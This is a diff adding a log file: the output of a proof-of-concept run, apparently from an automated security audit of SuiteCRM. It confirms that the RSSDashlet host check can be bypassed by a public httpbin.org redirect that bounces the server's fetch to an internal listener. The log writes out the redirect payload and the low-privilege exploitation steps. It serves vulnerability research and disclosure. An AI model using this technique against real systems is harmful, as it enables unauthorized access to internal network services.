@@ -1,0 +1,21 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-094/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-094/../.venv
+========================================================================
+VULN-094: validate_external_host() bypass via HTTP redirect chain (RSSDashlet render)
+target: http://localhost:33116
+========================================================================
+[SETUP] OOB HTTP listener on 0.0.0.0:33119 (app reaches it at 172.18.0.1:33119)
+[SETUP] inner (internal-only, guard-rejected-if-direct) target: http://172.18.0.1:33119/canary-rss094_ab9c346b
+[SETUP] outer (public, guard-approved) redirector: https://httpbin.org/redirect-to?url=http%3A%2F%2F172.18.0.1%3A33119%2Fcanary-rss094_ab9c346b&status_code=302
+[STEP] admin web login (provisioning only)
+[OK] admin session established
+[STEP] provisioning a fresh NON-ADMIN user (proves PR:L for the render/trigger step)
+[OK] created user mod_ed9dd531 (id=019bfe02-580a-4acb-8ffb-b236d1fd5bbb)
+[STEP] seeding mod_ed9dd531's Home dashboard with an RSSDashlet(url=https://httpbin.org/redirect-to?url=http%3A%2F%2F172.18.0.1%3A33119%2Fcanary-rss094_ab9c346b&status_code=302) via the app's own User::setPreference() API (docker compose exec app php)
+[OK] dashlet dash_1f4b2bb5 saved to mod_ed9dd531's preferences
+[STEP] web login as low-priv user mod_ed9dd531
+[OK] low-priv session established
+[STEP] POST CallMethodDashlet(method=display, id=dash_1f4b2bb5) -- renders via the GUARDED RSSDashlet::getRSSOutput()/validate_external_host() path
+[INFO] render HTTP 200, body: '<div id=\'rss_dash_1f4b2bb5\' style=\'overflow: auto; width: 100%; height: 200px; border: 1px #ddd solid\'>\n<table class=\'edit view\'><tr>\n<td>\n    <h3><a href="" target="_child">hit</a></h3>\n    \n</td>\n</tr></table>\n</div><br />'
+[PROOF] OOB listener received GET /canary-rss094_ab9c346b during the render call -- validate_external_host() at RSSDashlet.php:161 approved the ORIGINAL httpbin.org URL (a genuine public host), then file_get_contents() at :165 silently followed the 302 to the internal-only listener with no re-validation of the redirect target.
+==> VULN-094: CONFIRMED — guard-approved public redirector bounced the guarded RSSDashlet fetch to http://172.18.0.1:33119/canary-rss094_ab9c346b; OOB listener logged the hit
